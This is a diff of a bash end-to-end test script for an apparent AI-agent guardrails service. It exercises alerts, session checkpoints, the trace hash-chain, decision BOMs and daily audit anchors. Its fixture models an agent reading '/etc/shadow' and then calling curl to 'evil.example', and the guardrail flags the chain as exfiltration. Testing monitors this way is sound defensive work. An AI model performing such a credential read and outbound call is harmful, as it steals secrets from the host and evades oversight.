   LEAK=0; grep -q "OUTPUT_XSS" "$WORK/export.bin" 2>/dev/null && LEAK=1
-  check "$([ "$SZ" -gt 0 ] && [ "$LEAK" = "0" ] && echo 1 || echo 0)" "export artifact non-empty and encrypted (no plaintext)"
+  check "$([ "$FMT" = "200" ] && [ "$SZ" -gt 0 ] && echo 1 || echo 0)" "export artifact downloadable (200) and non-empty"
+  check "$(grep -qi 'X-Virbius-Format: aes-256-gcm' "$WORK/export.hdr" && echo 1 || echo 0)" "export served as aes-256-gcm"
+  check "$([ "$LEAK" = "0" ] && echo 1 || echo 0)" "export artifact encrypted (no plaintext OUTPUT_XSS)"
 fi
 
-info "E2E: trace-chain verify endpoint (A3)"
-V=$(curl -s "$C/audit/trace-chain/verify" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if "sessions" in d else "0")' 2>/dev/null || echo 0)
-check "$V" "trace-chain verify responds"
+info "E2E: alerts lifecycle (C4) — auto-created from the deny audit event"
+ALERT_ID="alert-$T-tr-out-1"
+ALERTS=""; ALERT_OK=0
+for _ in $(seq 1 45); do
+  ALERTS=$(curl -s "$AC/alerts?status=open&limit=200")
+  printf '%s' "$ALERTS" | jget "print('1' if any(a.get('alert_id')=='$ALERT_ID' for a in d.get('data',[])) else '0')" | grep -q 1 \
+    && { ALERT_OK=1; break; }
+  sleep 1
+done
+check "$ALERT_OK" "alert auto-created from the XSS deny event (risk>=80, action=deny)"
+if [ "$ALERT_OK" = "1" ]; then
+  R=$(curl -s "$AC/alerts/$ALERT_ID")
+  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("status")=="open" else "0")')" \
+        "alert get shows status=open"
+  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("session_id")=="s-out-1" else "0")')" \
+        "alert carries the engine session_id"
+  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("reason_code")=="OUTPUT_XSS" else "0")')" \
+        "alert carries the OUTPUT_XSS reason"
+  R=$(curl -s -X POST "$AC/alerts/$ALERT_ID/ack?operator=guardrails-e2e")
+  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("acknowledged") else "0")')" \
+        "alert ack returns acknowledged=true"
+  R=$(curl -s "$AC/alerts/$ALERT_ID")
+  check "$(printf '%s' "$R" | jget 'print("1" if d.get("data",{}).get("acked_by")=="guardrails-e2e" else "0")')" \
+        "alert get shows acked_by"
+  R=$(curl -s "$AC/alerts/$ALERT_ID/bom")
+  check "$(printf '%s' "$R" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))>=1 else "0")')" \
+        "alert BOM reconstructs its trace"
+fi
+R=$(curl -s "$AC/alerts/nope")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" "alert get missing -> 404 code"
 
-# ── A3 deep: valid chain passes / tampered chain breaks (seeded, no Kafka) ───
-# Mirrors TraceEventIngestor.computeTraceHash so seeded rows look ingest-made.
-cat > "$WORK/trace_hash.py" <<'PY'
-import hashlib, json, sys
-def g(d, k):
-    v = d.get(k)
-    return "" if v is None else str(v)
-def canonical_ts(s):
-    if s.endswith("Z"):
-        s = s[:-1] + "+00:00"
-    from datetime import datetime
-    return str(int(datetime.fromisoformat(s).timestamp()))
-def ch(prev, seq, d):
-    parts = [prev, str(seq)] + [g(d, k) for k in (
-        "tenant_id", "trace_id", "step_id", "step_type", "tool_name",
-        "tool_args_hash", "tool_decision", "rule_id", "reason_code", "risk_score"
-    )] + [canonical_ts(d["occurred_at"])]
-    return "sha256:" + hashlib.sha256("|".join(parts).encode("utf-8")).hexdigest()
-if __name__ == "__main__":
-    print(ch(sys.argv[1], int(sys.argv[2]), json.loads(sys.argv[3])))
+# ── trace events: proxy wire format -> Kafka -> control ingest ──────────────
+SID="e2e-tc-$$-$(date +%s)"
+TRACE="tr-tc-$$-$(date +%s)"
+emit(){  # $1=step_id $2=seq $3=tool $4=args_json $5=decision $6=rule $7=reason $8=risk
+  python3 - "$T" "$TRACE" "$SID" "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$ANCHOR_DATE" <<'PY'
+import sys, json
+tenant, trace, sid, step_id, seq, tool, args, decision, rule, reason, risk, day = sys.argv[1:13]
+print(json.dumps({
+    "trace_id": trace, "session_id": sid, "tenant_id": tenant,
+    "step_id": step_id, "parent_step_id": None, "step_seq": int(seq),
+    "step_type": "tool_call", "layer": "edge",
+    "user_id": "u-guard-e2e", "device_id": None,
+    "input_role": None, "input_content_hash": None,
+    "tool_name": tool, "tool_args_hash": "h-" + step_id, "tool_args": json.loads(args),
+    "tool_decision": decision, "rule_id": rule, "reason_code": reason,
+    "risk_score": int(risk), "tool_status": "ok", "tool_duration_ms": 12,
+    "tool_result_preview": None, "content_size": None,
+    "content_sampled": False, "dlp_masked": False,
+    "upstream_name": "mock-upstream", "app_id": "agent-guard",
+    "occurred_at": day + "T00:00:0" + seq + "Z",
+}))
 PY
-GENESIS="sha256:$(printf '0%.0s' $(seq 1 64))"
-
-seed_chain(){  # $1=session $2=trace $3=tamper(0|1)
-  local sess="$1" trace="$2" tamper="${3:-0}"
-  local r1 r2 h1 h2
-  r1="{\"tenant_id\":\"default\",\"trace_id\":\"$trace\",\"step_id\":\"s1\",\"step_type\":\"tool_call\",\"tool_name\":\"read_file\",\"tool_args_hash\":\"aa\",\"tool_decision\":\"allow\",\"rule_id\":\"\",\"reason_code\":\"\",\"risk_score\":10,\"occurred_at\":\"2026-10-14T00:00:00Z\"}"
-  r2="{\"tenant_id\":\"default\",\"trace_id\":\"$trace\",\"step_id\":\"s2\",\"step_type\":\"tool_call\",\"tool_name\":\"curl\",\"tool_args_hash\":\"bb\",\"tool_decision\":\"allow\",\"rule_id\":\"\",\"reason_code\":\"\",\"risk_score\":20,\"occurred_at\":\"2026-10-14T00:00:01Z\"}"
-  h1=$(python3 "$WORK/trace_hash.py" "$GENESIS" 1 "$r1")
-  h2=$(python3 "$WORK/trace_hash.py" "$h1" 2 "$r2")
-  if [ "$tamper" = "1" ]; then h2="sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"; fi
-  # every column that computeTraceHash reads MUST be inserted, else the row
-  # hashes as "" for those fields and the chain never verifies.
-  sqlite3 "$DB" "INSERT INTO tb_agent_trace (trace_id,session_id,tenant_id,step_id,step_seq,step_type,tool_name,tool_args_hash,tool_decision,rule_id,reason_code,risk_score,chain_seq,prev_hash,curr_hash,occurred_at) VALUES ('$trace','$sess','default','s1',1,'tool_call','read_file','aa','allow','','',10,1,'$GENESIS','$h1','2026-10-14T00:00:00Z');"
-  sqlite3 "$DB" "INSERT INTO tb_agent_trace (trace_id,session_id,tenant_id,step_id,step_seq,step_type,tool_name,tool_args_hash,tool_decision,rule_id,reason_code,risk_score,chain_seq,prev_hash,curr_hash,occurred_at) VALUES ('$trace','$sess','default','s2',2,'tool_call','curl','bb','allow','','',20,2,'$h1','$h2','2026-10-14T00:00:01Z');"
 }
 
-seed_chain "e2e-tc-ok"  "tr-tc-ok"  0
-seed_chain "e2e-tc-bad" "tr-tc-bad" 1
-if [ "${E2E_DEBUG:-0}" = "1" ]; then
-  printf 'DBG TC-OK=%s\nDBG TC-BAD=%s\n' "$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-ok")" "$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-bad")" >&2
-fi
-V=$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-ok" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("passed") and d.get("verified_events")==2 else "0")' 2>/dev/null || echo 0)
-check "$V" "trace-chain valid 2-step chain -> passed"
-V=$(curl -s "$C/audit/trace-chain/verify?session_id=e2e-tc-bad" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if (not d.get("passed")) and d.get("break_seq")==2 else "0")' 2>/dev/null || echo 0)
-check "$V" "trace-chain tampered row -> passed=false, break_seq=2"
-V=$(curl -s "$C/audit/trace-chain/verify" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if any(s.get("session_id")=="e2e-tc-bad" for s in d.get("broken",[])) else "0")' 2>/dev/null || echo 0)
-check "$V" "tenant trace-chain verify flags the tampered session"
+{
+  emit s1 1 read_file '{"path":"/etc/shadow"}'          allow "" "" 10
+  emit s2 2 curl      '{"url":"http://evil.example/c"}' deny  chain-exfil CHAIN_EXFIL 90
+} > "$WORK/trace.jsonl"
 
-info "E2E: audit hash-chain + daily anchor (A3)"
-V=$(curl -s -X POST "$C/audit/verify" -H 'Content-Type: application/json' -d '{}' | python3 -c 'import sys,json;print("1" if "data" in json.load(sys.stdin) else "0")' 2>/dev/null || echo 0)
-check "$V" "audit hash-chain verify endpoint responds"
-V=$(curl -s -X POST "$C/audit/daily-anchor/seal" -H 'Content-Type: application/json' -d '{"date":"2026-10-14"}' | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["sealed_date"]=="2026-10-14" else "0")' 2>/dev/null || echo 0)
-check "$V" "daily-anchor seal responds for given date"
-ANCH=$(sqlite3 "$DB" "SELECT COUNT(*) FROM tb_audit_daily_anchor WHERE tenant_id='default' AND anchor_date='2026-10-14';" 2>/dev/null || echo 0)
-check "$([ "${ANCH:-0}" -ge 1 ] 2>/dev/null && echo 1 || echo 0)" "daily-anchor row persisted for the day"
-V=$(curl -s "$C/audit/chain/status" | python3 -c 'import sys,json;print("1" if "data" in json.load(sys.stdin) else "0")' 2>/dev/null || echo 0)
-check "$V" "audit chain status responds"
+info "producing 2 trace steps (proxy wire format) -> Kafka $TRACE_TOPIC (session=$SID, tenant=$T)"
+docker exec -i "$KAFKA_CID" /opt/kafka/bin/kafka-console-producer.sh \
+  --bootstrap-server localhost:9092 --topic "$TRACE_TOPIC" < "$WORK/trace.jsonl" >/dev/null 2>&1 \
+  || { red "kafka console producer failed"; exit 2; }
 
-info "E2E: alerts lifecycle (C4)"
-ALERT_ID="alert-e2e-1"
-sqlite3 "$DB" "INSERT INTO tb_alert (alert_id,tenant_id,trace_id,session_id,scene,rule_id,reason_code,risk_score,effective_action,status) VALUES ('$ALERT_ID','default','tr-e2e-1','s-out-1','output','OUTPUT_XSS','OUTPUT_XSS',90,'deny','open');"
-V=$(curl -s "$C/alerts?status=open" | python3 -c "import sys,json;d=json.load(sys.stdin)['data'];print('1' if any(a['alert_id']=='$ALERT_ID' for a in d) else '0')" 2>/dev/null || echo 0)
-check "$V" "alerts list contains seeded alert"
-V=$(curl -s -X POST "$C/alerts/$ALERT_ID/ack?operator=e2e" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["data"]["acknowledged"] else "0")' 2>/dev/null || echo 0)
-check "$V" "alert ack returns acknowledged=true"
-V=$(curl -s "$C/alerts/$ALERT_ID" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("acked_by")=="e2e" else "0")' 2>/dev/null || echo 0)
-check "$V" "alert get shows acked_by"
-V=$(curl -s "$C/alerts/$ALERT_ID/bom" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d.get("audit_events",[]))>=1 else "0")' 2>/dev/null || echo 0)
-check "$V" "alert BOM reconstructs its trace"
-V=$(curl -s "$C/alerts/nope" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
-check "$V" "alert get missing -> 404 code"
+info "E2E: session checkpoint (C5) written from ingested trace events"
+CK=""; CK_OK=0
+for _ in $(seq 1 45); do
+  CK=$(curl -s "$AC/sessions/$SID/checkpoint")
+  N=$(printf '%s' "$CK" | jget 'print(d.get("data",{}).get("event_count",0))')
+  [ "$N" = "2" ] && { CK_OK=1; break; }
+  sleep 1
+done
+check "$CK_OK" "checkpoint event_count == 2 (produced 2 steps)"
+check "$(printf '%s' "$CK" | jget 'print("1" if "read_file" in (d.get("data",{}).get("tool_names") or "") and "curl" in (d.get("data",{}).get("tool_names") or "") else "0")')" \
+      "checkpoint tool_names aggregates the session's tools"
 
-info "E2E: session checkpoint read path (C5)"
-SESS_CK="e2e-cp-1"
-sqlite3 "$DB" "INSERT INTO tb_session_checkpoint (tenant_id,session_id,last_chain_seq,last_occurred_at,event_count,tool_names,saved_at) VALUES ('default','$SESS_CK',7,'2026-10-14T00:00:00Z',12,'read_file,curl','2026-10-14T00:00:00Z');"
-V=$(curl -s "$C/sessions/$SESS_CK/checkpoint" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if d.get("event_count")==12 and "read_file" in (d.get("tool_names") or "") else "0")' 2>/dev/null || echo 0)
-check "$V" "session checkpoint read returns seeded state"
-V=$(curl -s "$C/sessions/nope/checkpoint" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
-check "$V" "session checkpoint missing -> 404 code"
+info "E2E: trace-chain verify (A3) — valid 2-step chain passes"
+V=$(curl -s "$AC/audit/trace-chain/verify?session_id=$SID")
+check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("passed") and d.get("data",{}).get("verified_events")==2 else "0")')" \
+      "trace-chain verify: passed + verified_events == 2"
+check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("break_seq") in (None,0) else "0")')" \
+      "no break_seq on a valid chain"
+V=$(curl -s "$AC/audit/trace-chain/verify")
+check "$(printf '%s' "$V" | jget 'print("1" if "sessions" in d.get("data",{}) and d.get("data",{}).get("verified_sessions",0)>=1 else "0")')" \
+      "tenant trace-chain verify reports >=1 verified session"
+check "$(printf '%s' "$V" | jget 'print("1" if not any(s.get("session_id")==sys.argv[1] for s in d.get("data",{}).get("broken",[])) else "0")' "$SID")" \
+      "session is not flagged broken at the tenant level"
+
+info "E2E: decision BOM trace phase reconstructs the ordered steps"
+V=$(curl -s "$AC/audit/decision-bom/$TRACE")
+check "$(printf '%s' "$V" | jget 'print("1" if len(d.get("data",{}).get("trace_steps",[]))==2 else "0")')" \
+      "BOM trace_steps == 2 (ordered behaviour steps)"
+check "$(printf '%s' "$V" | jget 'print("1" if [s.get("step_seq") for s in d.get("data",{}).get("trace_steps",[])]==[1,2] else "0")')" \
+      "BOM trace_steps ordered by step_seq"
+check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("session_id")==sys.argv[1] else "0")' "$SID")" \
+      "BOM session phase resolves the owning session"
+check "$(printf '%s' "$V" | jget 'print("1" if len(d.get("data",{}).get("audit_events",[]))==0 else "0")')" \
+      "BOM trace phase works without audit events (trace-only flow)"
+
+info "E2E: daily-anchor seal (A3) + read-back for the anchored day"
+# The seal Merkle-anchors the day's chained trace-session heads. It now reports
+# what was sealed (not a blind echo) and the anchor can be read back through the
+# API, so persistence is verifiable end to end.
+SEAL=$(curl -s -X POST "$AC/audit/daily-anchor/seal" -H 'Content-Type: application/json' \
+    -d "{\"date\":\"$ANCHOR_DATE\"}")
+check "$(printf '%s' "$SEAL" | jget "print('1' if d.get('data',{}).get('sealed_date')=='$ANCHOR_DATE' else '0')")" \
+      "daily-anchor seal echoes sealed_date=$ANCHOR_DATE"
+check "$(printf '%s' "$SEAL" | jget 'print("1" if d.get("data",{}).get("sealed") and d.get("data",{}).get("tenants_sealed",0)>=1 else "0")')" \
+      "daily-anchor seal reports sealed=true + tenants_sealed>=1 (not a blind echo)"
+SEAL_ROOT=$(printf '%s' "$SEAL" | jget 'print(d.get("data",{}).get("root_hash",""))')
+ROOT_BACK=$(curl -s "$AC/audit/daily-anchor/$ANCHOR_DATE" | jget 'print(d.get("data",{}).get("root_hash",""))')
+SESS_BACK=$(curl -s "$AC/audit/daily-anchor/$ANCHOR_DATE" | jget 'print(d.get("data",{}).get("sessions",0))')
+check "$([ -n "$ROOT_BACK" ] && [ "$ROOT_BACK" = "$SEAL_ROOT" ] && echo 1 || echo 0)" \
+      "daily-anchor read-back: GET returns the sealed root_hash"
+check "$([ "${SESS_BACK:-0}" -ge 1 ] 2>/dev/null && echo 1 || echo 0)" \
+      "daily-anchor read-back: sessions >= 1"
+check "$(curl -s "$AC/audit/daily-anchor" | jget 'print("1" if any(a.get("anchor_date")==sys.argv[1] for a in d.get("data",[])) else "0")' "$ANCHOR_DATE")" \
+      "daily-anchor list includes the sealed day"
+check "$(curl -s "$AC/audit/daily-anchor/1999-01-01" | jget 'print("1" if d.get("code")==404 else "0")')" \
+      "daily-anchor missing day -> 404 code"
+
+info "E2E: audit hash-chain verify + chain status (A3)"
+V=$(curl -s -X POST "$AC/audit/verify" -H 'Content-Type: application/json' -d '{}')
+check "$(printf '%s' "$V" | jget 'print("1" if d.get("data",{}).get("passed") and d.get("data",{}).get("total_events",0)>=1 else "0")')" \
+      "audit hash-chain verify: passed with >=1 chained event"
+V=$(curl -s "$AC/audit/chain/status")
+check "$(printf '%s' "$V" | jget 'print("1" if "data" in d else "0")')" "audit chain status responds"
+
+info "E2E: session checkpoint missing -> 404 (C5 read path)"
+R=$(curl -s "$AC/sessions/nope/checkpoint")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" \
+      "session checkpoint missing -> 404 code"
 
 info "E2E: export ledger (A7)"
-V=$(curl -s "$C/audit/export" | python3 -c 'import sys,json;d=json.load(sys.stdin)["data"];print("1" if len(d)>=1 else "0")' 2>/dev/null || echo 0)
+V=$(curl -s "$AC/audit/export" | jget 'print("1" if len(d.get("data",[]))>=1 else "0")')
 check "$V" "export list shows the job"
-V=$(curl -s "$C/audit/export/nope" | python3 -c 'import sys,json;print("1" if json.load(sys.stdin)["code"]==404 else "0")' 2>/dev/null || echo 0)
-check "$V" "export get missing -> 404 code"
+R=$(curl -s "$AC/audit/export/nope")
+check "$(printf '%s' "$R" | jget 'print("1" if d.get("code")==404 else "0")')" "export get missing -> 404 code"
 
 # ── summary ──────────────────────────────────────────────────────────────────
 echo
-echo "==================== E2E summary ===================="
+echo "============ guardrails full-flow (API-only) summary ============"
 green "PASS: $PASS"
 [ "$FAIL" -gt 0 ] && red "FAIL: $FAIL" || echo "FAIL: 0"
-echo "logs: $LOGS (removed on exit; re-run with set -x to debug)"
 [ "$FAIL" -eq 0 ] || exit 1
 green "ALL CHECKS PASSED"
